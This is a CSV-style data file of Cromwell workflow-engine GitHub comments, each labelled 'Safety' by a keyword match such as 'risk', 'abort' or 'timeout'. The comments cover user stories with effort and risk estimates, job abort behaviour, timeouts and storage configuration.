Safety,"As a **user of all types**, I want **to read documentation about how to access logs**, so that I can **debug my issues, whether they are within the workflow or outside of it**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087:201,Risk,Risk,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1622#issuecomment-325477087,1,['Risk'],['Risk']
Safety,"As a **user running a backend via TES**, I want **Cromwell to test the latest TES version as exemplified by Funnel**, so that **regressions are caught in testing**.; * Effort: Small to Medium; * Risk: Small; * Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332627515:195,Risk,Risk,195,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2396#issuecomment-332627515,1,['Risk'],['Risk']
Safety,"As a **user running the same workflows repeatedly**, I want **Cromwell to hash the outputs of my workflows**, so that **I can safely call cache on my outputs and I don't have to worry if they changed**.; - effort: Small to medium ; - risk: Small ; - business value: Small",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054:126,safe,safely,126,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1964#issuecomment-344682054,2,"['risk', 'safe']","['risk', 'safely']"
Safety,"As a **user running workflows and setting up configs**, I want **Cromwell to (fail nicely?) when I reference a pluggable backend class that's not on the classpath**, so that I can **(still run my workflow? get a nice error message?)**. @geoffjentry ; - Effort: **Small?**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953:275,Risk,Risk,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953,1,['Risk'],['Risk']
Safety,"As a **user running workflows on P.API**, I want **clear error messages when I put in an invalid zone**, so that **I know to change the zone and Cromwell doesn't infinitely retry (and spend all my money).**. - Effort: Small; - Risk: Small; - Business value: Small to Medium; - @ruchim have you heard of users running into this issue?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1915#issuecomment-344986436:227,Risk,Risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1915#issuecomment-344986436,1,['Risk'],['Risk']
Safety,"As a **user running workflows on PAPI**, I want **my workflow to be upgraded from preemptible to regular compute if it is killed after 24 hours rather than retrying**, so that I can **avoid retrying on a job that will need more than 24 hours to run**.; - Effort: **Small**; - Risk: **Small to Medium**; - We'd need a way of being certain that the job was killed due to timeout, rather than another reason, to prevent from upgrading jobs that the user doesn't want upgraded.; - The information about a preemptible VM timing out should come from Google.; - This should be an ""opt-in"" feature, so users do not have the default behavior change from under them.; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-329479096:184,avoid,avoid,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2168#issuecomment-329479096,3,"['Risk', 'avoid', 'timeout']","['Risk', 'avoid', 'timeout']"
Safety,"As a **user running workflows on an HPC cluster**, I want **Cromwell to periodically check that my jobs are still running**, so that I can **know when jobs are alive versus when they reach the runtime limits and are killed by the backend**.; - Workaround: **Yes**; - from @delocalizer ; > The hacky non-async solution I have been using...was to have two check cycles, a frequent cheap one to see if rc existed and occasional expensive one to [poll the scheduler itself](https://github.com/delocalizer/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/backend/pbs/PbsBackend.scala#L128-L166); - Effort: **Small**; - Risk: **Small**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328207932:625,Risk,Risk,625,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1499#issuecomment-328207932,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to follow this order for looking at inputs: Inputs provided by the inputs JSON, Inputs specified explicitly by call, and then the default value in the task**, so that **Cromwell is processing the inputs that I want it to**. - Effort: @geoffjentry any thoughts?; - Risk: Small; - Business value: Small to Medium; - @cjllanwarne have any users asked or complained about this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2446#issuecomment-335540877:315,Risk,Risk,315,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2446#issuecomment-335540877,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to split up its docker hashes by registry**, so that **if one registry is slow, that it doesn't affect the performance of the other registries**.; - Effort: Small to medium; - Risk: Small; - Business value: Small to medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399:227,Risk,Risk,227,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2329#issuecomment-335931399,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **Cromwell to use a default job count limit if I have not configured a `concurrent-job-limit`**, so that **the backend defaults to a sensible job limit**.; * Effort: Small; * Risk: Small; * Business Value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911:215,Risk,Risk,215,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want **to see fewer unhelpful log messages**, so that **performance improves and it is easier to find important messages**. More information and improvement ideas in the [Logging spec](https://docs.google.com/document/d/1Dc37EaPDoWXacSSzLgCdndx9zo5k6EmE5tvg-2fisPo/edit#). - effort: Small to Medium; - risk: Small; - Currently we show too many log messages, which degrades performance. We risk showing too few, but I think it's a risk we can mitigate.; - business value: Medium ; - Our logs are where users go to debug workflows, and currently they are a haystack to pick through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674:337,risk,risk,337,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1807#issuecomment-344984674,3,['risk'],['risk']
Safety,"As a **user running workflows**, I want to **be able to specify the backend in workflow options**, so that **Cromwell only uses the default backend when no other is specified, and notifies the user that it is using the default**. - Effort: X-Small to Small; - Risk: Small; - Note that some WDL may break, consider ways to deprecate (with warning messages in the WDLs).; - Business value: Small, for now; - This may change as Cromwell supports more backends and more users operate in a multi-backend environment",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335814075:260,Risk,Risk,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1312#issuecomment-335814075,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **know how to `expandSubworkflows` by reading the documentation**, so that **I know when to use this feature**. Effort: Small; Risk: Extra-Small; Business value: Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2420#issuecomment-333186989:170,Risk,Risk,170,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2420#issuecomment-333186989,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **override runtime variables**, so that I can **change hardcoded runtime attributes when someone else wrote the method**.; - Effort: **Small**; - Risk: **Small**; - Carefully vet a good solution; - Avoid breaking changes; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418:189,Risk,Risk,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418,2,"['Avoid', 'Risk']","['Avoid', 'Risk']"
Safety,"As a **user running workflows**, I want to **see a timing diagram or other useful error message when my workflow has failed before making any calls**, so that **I know why I don't see the timing diagram like I expect.**; - Effort: Small; - Risk: X-Small; - Business value: Small; - I haven't heard any mention of this for a while from customers or other internal folk.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1887#issuecomment-345359398:240,Risk,Risk,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1887#issuecomment-345359398,1,['Risk'],['Risk']
Safety,"As a **user running workflows**, I want to **see my stderr output even when Cromwell gets a ""FileNotFound"" response** so that I can **debug my workflow**.; - Effort: Small to Medium; - We're not sure of the exact way to fix it, so for now we have been patching the issue.; - Risk: Small; - Business value: Small; - There is a workaround, to manually look up the stderr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2378#issuecomment-336149092:275,Risk,Risk,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2378#issuecomment-336149092,1,['Risk'],['Risk']
Safety,"As a **user setting up Cromwell**, I want **only want to see references to Google Genomics Pipelines API**, so that **I know how to set up the Google backend, not some JES thing.**; - effort: small; - risk: small to medium; - business value: small; - may grow if it becomes confusing",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-344685888:201,risk,risk,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2019#issuecomment-344685888,1,['risk'],['risk']
Safety,"As a **user with images in Singularity**, I want **Cromwell to support using Singularity images (either via Singularity Hub and the command line, or connecting via API)**, so that I can **use Singularity images and not have to duplicate them in Docker**.; - Effort: ** @geoffjentry ? **; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-330341279:290,Risk,Risk,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-330341279,1,['Risk'],['Risk']
Safety,"As a **user**, I want **Cromwell to not check the backend attribute**, so that I can **not be distracted by strange warnings that aren't actually useful**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1997#issuecomment-328541603:180,Risk,Risk,180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1997#issuecomment-328541603,1,['Risk'],['Risk']
Safety,"As a **workbench QA**, I want **to know what is being tested**, so that I **don't under- or over-test for each release**. ; - Effort: **Medium**; - Risk: **Small**; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-326636660:148,Risk,Risk,148,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-326636660,1,['Risk'],['Risk']
Safety,"As a **workflow runner running on Local**, I want **Cromwell to localize one copy of a file from the cloud when I use it multiple times in my workflow**, so that I **am only charged egress to local once**.; - Effort: **?** @geoffjentry ; - Risk: **?** @geoffjentry ; - Be careful that inputs aren't being modified in place before allowing them to be used again; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-328201762:240,Risk,Risk,240,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-328201762,1,['Risk'],['Risk']
Safety,"As a **workflow runner using the CLI**, I want **an option to send the output JSON into a separate file**, so that I can **avoid digging through the whole metadata for the information I need**.; - Effort: **Small** ; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328204540:123,avoid,avoid,123,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1578#issuecomment-328204540,2,"['Risk', 'avoid']","['Risk', 'avoid']"
Safety,"As a **workflow runner**, I want **Cromwell to automatically retry my workflow with increased memory/disk/on a specific error code, etc**, so that I can **get my workflow to complete without having to manually intervene**.; - Effort: **?** @geoffjentry ; - Risk: **Medium**; - if users are unaware that they have retries set in ways that would cost them a lot the 2nd or tertiary run, i.e to double their memory, they could end up paying for a much more expensive VM when a smaller one would do; - Business value: **Large**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-327935408:257,Risk,Risk,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1991#issuecomment-327935408,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **periodically copy workflow logs**, so that I can **view intermediary results without waiting for the workflow to complete**.; - Effort: **Small**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-327890924:184,Risk,Risk,184,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1448#issuecomment-327890924,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to be able to reference Cromwell's workflow ID in a WDL**, so that I can **programmatically query for metadata about that workflow**.; - Effort: **Small** ; - Risk: **Small** ; - Business value: **Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328202942:194,Risk,Risk,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328202942,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to be able to select certain tasks to call cache or not call cache on**, so that I can **?**. @LeeTL1220 to help with this. @geoffjentry thoughts on the following?; - Effort: **TBD**; - Risk: **TBD**; - Business value: **TBD**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023:221,Risk,Risk,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1695#issuecomment-326664023,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to delete information I no longer need from a workflow**, so that I can **stop paying for storage for it**.; - Effort: **Large**; - Risk: **Medium to Large**; - - implications for call caching?; - - provenance?; - Business value: **Medium to Large**; - - big cost-saver",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-325483057:167,Risk,Risk,167,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1292#issuecomment-325483057,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **to selectively invalidate a workflow so that Cromwell does not use it for a cache-hit**, so that I can **not use bad or old workflow results in my new workflows**.; - Effort: **Medium**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116:224,Risk,Risk,224,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-327930116,1,['Risk'],['Risk']
Safety,"As a **workflow runner**, I want **use Command+C to abort running jobs**, so that I can **fully shut down Cromwell using a standard command shortcut**.; - Effort: **?** @geoffjentry ; - Risk: **?**; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1495#issuecomment-328200426:52,abort,abort,52,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1495#issuecomment-328200426,2,"['Risk', 'abort']","['Risk', 'abort']"
Safety,"As far as I can tell, when this happens today, the WEA crashes and hopes that the WA will recover it, but that doesn't actually seem to happen. What seems to happen is the WA sends a message back to the (now defunct) WEA asking it to please abort whatever it was working on.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665248398:90,recover,recover,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665248398,2,"['abort', 'recover']","['abort', 'recover']"
Safety,"As long as we can still do ""Abort All"" and support Ctrl-C",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200836619:28,Abort,Abort,28,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/606#issuecomment-200836619,1,['Abort'],['Abort']
Safety,"At the risk of derailing this into a 1.1 thread, I have heard that WDL 1.1 adds support for directory outputs (which would completely sidestep like 50% of the issues I currently have when writing WDLs, including this one involving basename/sub/select_first) but I don't see that on the 1.1 spec -- is that a 1.1 feature or a development (1.2?) feature?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172:7,risk,risk,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6840#issuecomment-1233537172,1,['risk'],['risk']
Safety,"Based on extensive log-examination, I believe this change has somehow broken the ability of a CWL workflow to survive restarts. Some suites pass some of the time due to a confluence of (1) getting lucky and avoiding a restart and (2) retries. It is very often the case that a test case only succeeds on the second or third try. Because I don't want anything to slip through the cracks due to probability, I'm not personally going to call this green until I see zero `Could not read from gs://cloud-cromwell-dev/cromwell_execution/travis/` messages.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428253066:207,avoid,avoiding,207,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4203#issuecomment-428253066,1,['avoid'],['avoiding']
Safety,"Based on the conversation after standup yesterday, this ticket needs more refinement. Currently, recovering a call for the local backend is the same as executing a fresh call. It's possible there are other ways to wire recovery and that question needs to be answered. @kcibul @geoffjentry I'm returning it to the milestone backlog but hopefully something we can discuss at the prioritization today--seems like a technical/PO type of refinement.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/666#issuecomment-235909645:97,recover,recovering,97,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/666#issuecomment-235909645,2,['recover'],"['recovering', 'recovery']"
Safety,"Be aware that ""Abort"" is only functional if you're using the JesBackend in your cromwell.conf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173969537:15,Abort,Abort,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-173969537,1,['Abort'],['Abort']
Safety,"But someone is one of our most important stakeholders! 😛. Totally agree with closing this, we can work out the desired behavior when we fix abort in Cromwell 50.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332687013:140,abort,abort,140,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2415#issuecomment-332687013,1,['abort'],['abort']
Safety,Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; wdl4s.exception.VariableLookupException: Couldn't resolve all inputs for dna_mapping_38.libraryMerge at index Some(0).:; Input evaluation for Call dna_mapping_38.libraryMerge failed.:; 	inputBams:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	outputBam:; 	Could not find the shard mapping to this scatter dna_mapping_38.$scatter_1; 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:49); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$resolveAndEvaluateInputs$1.applyOrElse(JobPreparationActor.scala:48); 	at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); 	at scala.util.Failure.recoverWith(Try.scala:203); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.resolveAndEvaluateInputs(JobPreparationActor.scala:48); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor$$anonfun$receive$1.applyOrElse(JobPreparationActor.scala:27); 	at akka.actor.Actor$class.aroundReceive(Actor.scala:484); 	at cromwell.engine.workflow.lifecycle.execution.CallPreparationActor.aroundReceive(JobPreparationActor.scala:18); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); 	at akka.actor.ActorCell.invoke(ActorCell.scala:495); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:234); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.Fo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512:3365,recover,recoverWith,3365,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1802#issuecomment-268422512,1,['recover'],['recoverWith']
Safety,"Closed, aborts will someday change this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1376#issuecomment-289825174:8,abort,aborts,8,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1376#issuecomment-289825174,1,['abort'],['aborts']
Safety,Closing as redundant. See #2638.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2569#issuecomment-331458725:11,redund,redundant,11,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2569#issuecomment-331458725,1,['redund'],['redundant']
Safety,Closing due to redundancy,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301:15,redund,redundancy,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7183#issuecomment-1645438301,1,['redund'],['redundancy']
Safety,Closing this as #5468 changes the underlying code and might have made this redundant.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-655510540:75,redund,redundant,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5447#issuecomment-655510540,1,['redund'],['redundant']
Safety,Closing this ticket as the test hasn't failed since #4231 was merged (4231 added span scale factor which increased the timeout duration for Jenkins).,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4237#issuecomment-429876685:119,timeout,timeout,119,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4237#issuecomment-429876685,1,['timeout'],['timeout']
Safety,"Closing this, as far as I can tell this should not be happening anymore as per https://github.com/broadinstitute/cromwell/pull/2808 (unless the underlying jobs are indeed stuck in which case Cromwell will wait until they reach a terminal status). If that happens we talked about having a separate endpoint like ""just mark this workflow aborted anyway"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-342587383:336,abort,aborted,336,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1976#issuecomment-342587383,1,['abort'],['aborted']
Safety,Closing this. It is already fixed with a timeout-seconds options in the SFSBackend,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3648#issuecomment-769183176:41,timeout,timeout-seconds,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3648#issuecomment-769183176,1,['timeout'],['timeout-seconds']
Safety,Closing. Preferring #5887 because it's less risky and this one has another known problem lurking just around the corner.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5886#issuecomment-698589438:44,risk,risky,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5886#issuecomment-698589438,1,['risk'],['risky']
Safety,"Commented on at least simplifying the timeout code, possibly removing it altogether. Back to @mcovarr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/314#issuecomment-162990401:38,timeout,timeout,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/314#issuecomment-162990401,2,['timeout'],['timeout']
Safety,Cool! I've been thinking about how to approach this too. I looked at [shapeless' Typeable](https://github.com/milessabin/shapeless/blob/master/core/src/main/scala/shapeless/typeable.scala#L28) (and [docs](https://github.com/milessabin/shapeless/wiki/Feature-overview:-shapeless-2.0.0#type-safe-cast)) which co-exists with [ValueTypeable](https://github.com/milessabin/shapeless/blob/master/core/src/main/scala/shapeless/typeable.scala#L53) (declare from -> to types). Dunno if it has any advantages over rolling your own but it's worth a look to see if there are any.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373570762:289,safe,safe-cast,289,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3413#issuecomment-373570762,1,['safe'],['safe-cast']
Safety,Created branch [`aen_3811`](https://github.com/broadinstitute/cromwell/compare/aen_3811?expand=1) that concisely illustrates how to detect the problem before it happens; fix TBD,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-419132650:132,detect,detect,132,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3811#issuecomment-419132650,1,['detect'],['detect']
Safety,"Cromwell does not support WDL 1.1 at the moment, although I think there may still be an underlying bug here -- I have seen odd behavior in Cromwell using Structs in WDL 1.0 where the contents of the struct may be undefined. If you want to use WDL 1.1, I recommend [miniwdl](https://github.com/chanzuckerberg/miniwdl) as an alternative to Cromwell. If you need to use Cromwell (eg you need to use Terra), I recommend avoiding any optional types when using structs through some combination of `select_first()` and only interacting with your optional file `if length(some_array_with_optional_in_it) > 0`. You can also use `defined()`, but be aware that `defined(output_of_task_that_did_not_run)` can be true in some cases.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654:416,avoid,avoiding,416,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249#issuecomment-1846184654,1,['avoid'],['avoiding']
Safety,"Cromwell may submit more jobs to the Pipelines API than is able to run at one time, so they're held in a queue by Google Cloud. As jobs finish, the next job is run. There are a few ways to terminate a workflow (see the [Abort guide](https://cromwell.readthedocs.io/en/stable/execution/ExecutionTwists/#abort) for more information). But essentially you need Cromwell to gracefully shut down the workflow:. - In `run` mode, you can issue [SIGINT or SIGTERM](https://cromwell.readthedocs.io/en/stable/Configuring/#abort) which asks Cromwell to issue the abort requests to GCP,; - In `server` mode, you can issue an `abort` through a POST request. By running `scancel`, you may not give Cromwell sufficient time to perform this graceful shutdown process, and hence your jobs held in the GCP Pipelines queue will still execute.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898:220,Abort,Abort,220,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5380#issuecomment-579527898,9,"['Abort', 'abort']","['Abort', 'abort']"
Safety,"Cromwell now claims a workflow is aborted when it has confirmation from JES that all jobs have a terminal status. This does not necessarily mean that JES did successfully abort all of them, but that's an issue we should bring up to Google if it happens. I'm not sure what this ticket is suggesting to do so I won't close :)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-342589399:34,abort,aborted,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1409#issuecomment-342589399,2,['abort'],"['abort', 'aborted']"
Safety,"Current proposal is to support the [`disks` runtime attribute](http://cromwell.readthedocs.io/en/develop/RuntimeAttributes/#disks) using the following rules:. 1. For all tasks, provide a predictable bind mount for `local-disk`. Specifications for disk size and disk type will be ignored, as they are not needed or configurable at runtime for AWS Batch. ; 2. Other mount points that are defined (e.g. `disks: ""/mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""`) will result in additional bind mounts from the host container to the running docker container for the task. The disk size and disk type are ignored. The AWS Batch reference deployment for Cromwell will provide a mount point for each task which the `disks` will be structured under. As an example, assume the following runtime attribute definition:. ```; runtime {; disks: ""local-disk 100 SSD, /mnt/my_mnt 3 SSD, /mnt/my_mnt2 500 HDD""; }; ```. Will result in a filesystem tree structure on the host:. ```; /mnt/cromwell_io_mountpoint/; ├── $CROMWELL_TASK_ID; ├── /cromwell_root; └── /mnt/; ├── /my_mnt; └── /my_mnt2; ```. And the running container will see the `/cromwell_root`, `/mnt/my_mnt` and `/mnt/my_mnt2` directories.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923:187,predict,predictable,187,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-398854923,1,['predict'],['predictable']
